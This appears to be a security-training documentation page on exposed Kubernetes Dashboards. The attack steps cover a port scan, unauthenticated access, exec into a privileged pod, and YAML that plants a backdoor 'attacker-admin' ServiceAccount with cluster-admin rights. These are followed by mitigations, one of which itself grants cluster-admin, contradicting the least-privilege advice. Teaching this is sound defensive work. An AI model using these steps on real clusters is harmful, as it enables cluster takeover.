---
sidebar_position: 2
title: Exposed Kubernetes Dashboard
description: Exploiting an exposed Kubernetes Dashboard and implementing best practices to secure dashboard access.
---

# Exposed Kubernetes Dashboard

The Kubernetes Dashboard is a web-based interface for managing Kubernetes clusters. However, if not properly secured, it can become a significant attack vector. An exposed dashboard with admin privileges and no authentication can allow an attacker to gain full control over the cluster.

---

## Exploitation Steps: Exposed Dashboard

An attacker can identify an open Kubernetes Dashboard by performing a port scan:

```bash
nmap -p 30000-32767 <cluster-ip>
```

### 1. Access the Dashboard Without Authentication

The attacker locates the dashboard on a NodePort and accesses it through a web browser:

```bash
http://<cluster-ip>:<node-port>/
```

### 2. Execute Commands in the Cluster

The attacker uses the dashboard's terminal to execute commands in a privileged pod:

```bash
kubectl exec -it privileged-pod -- /bin/sh
```

### 3. Create a New Admin User

The attacker creates a new admin ServiceAccount and binds it to the cluster-admin role:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-admin
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: attacker-admin-binding
subjects:
- kind: ServiceAccount
  name: attacker-admin
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

### Result

The attacker gains admin access to the cluster, enabling them to deploy malicious workloads, exfiltrate data, or destroy resources.

---

## Mitigation Techniques and Fixes

### 1. Avoid Exposing the Dashboard Publicly

**Issue:** The dashboard is accessible without authentication over a NodePort.

**Fix:** Use a secure network proxy or port-forwarding instead.

#### Secure Access with Port Forwarding

```bash
kubectl proxy
# Access the dashboard securely
http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

### 2. Enforce Authentication

**Issue:** Lack of authentication allows unauthorized access.

**Fix:** Implement token-based authentication and disable guest access.

#### Enable Authentication via Service Account Token

```bash
kubectl create serviceaccount dashboard-admin -n kube-system
kubectl create clusterrolebinding dashboard-admin-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:dashboard-admin
kubectl get secrets -n kube-system | grep dashboard-admin
kubectl describe secret <dashboard-admin-token> -n kube-system
```

### 3. Restrict Dashboard Privileges

**Issue:** The dashboard runs with cluster-admin privileges, exposing the entire cluster to risk.

**Fix:** Limit the ServiceAccount permissions using RBAC.

#### Create a Restricted Role for the Dashboard

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: restricted-dashboard-role
  namespace: kube-system
rules:
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: restricted-dashboard-binding
  namespace: kube-system
subjects:
- kind: ServiceAccount
  name: dashboard
  namespace: kube-system
roleRef:
  kind: Role
  name: restricted-dashboard-role
  apiGroup: rbac.authorization.k8s.io
```

---

## Conclusion

To secure the Kubernetes Dashboard:

- Never expose the dashboard directly to the internet.
- Always enforce authentication using Service Account tokens.
- Apply the principle of least privilege by assigning restricted roles to the dashboard.
